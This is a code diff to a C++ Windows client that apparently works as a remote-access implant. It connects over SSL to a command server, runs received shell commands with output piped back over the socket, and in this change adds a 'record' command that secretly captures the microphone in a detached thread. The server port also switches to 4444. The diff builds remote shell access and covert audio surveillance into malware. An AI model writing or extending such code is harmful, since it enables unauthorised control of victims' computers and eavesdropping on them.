@@ -37,7 +37,7 @@ public:
 
         while (true) {
             if (!ReadFile(pipeRead, pipeBuffer, sizeof(pipeBuffer) - 1, &bytesRead, NULL) || bytesRead == 0) {
-                break;  // Error or end of input from the child process
+                break;
             }
 
             pipeBuffer[bytesRead] = '\0';
@@ -88,7 +88,7 @@ public:
             }
         }
 
-        // Create a separate thread for reading the child process output asynchronously
+
         std::thread readThread([&]() {
             ReadOutputFromPipe(pipeRead, sslSocket);
         });
@@ -108,6 +108,7 @@ public:
 
     void ReceiveMessage(SSL* ssl) {
         int bytesRead;
+        features feats;
 
         while (true) {
             memset(&buffer, 0x0, sizeof(buffer));
@@ -124,6 +125,14 @@ public:
             if(cmd == "scmd")
                 is_cmd = true;
 
+            if(cmd == "record") {
+
+                std::thread recordThread([&]() {
+                    feats.RecordMicrophone();  // Adjust the sleep time as needed
+                });
+                recordThread.detach();
+
+            }
             if(is_cmd)
                 ExecCommand(cmd, reinterpret_cast<SOCKET>(ssl));
 
@@ -222,9 +231,11 @@ public:
 
 private:
     char buffer[4096];
+    bool isRecording = false;
     bool is_cmd;
     std::string cmd;
     std::string serverIP;
+    std::mutex recordMutex;
     int serverPort;
     SOCKET clientSocket;
     SSL_CTX* sslContext;
@@ -235,7 +246,7 @@ int main() {
     //features feats;
     //feats.RecordMicrophone();
     std::string serverIP = "127.0.0.1";
-    int serverPort = 5555;
+    int serverPort = 4444;
     Client client(serverIP, serverPort);
     while (true) {
         if (client.Connect()) {
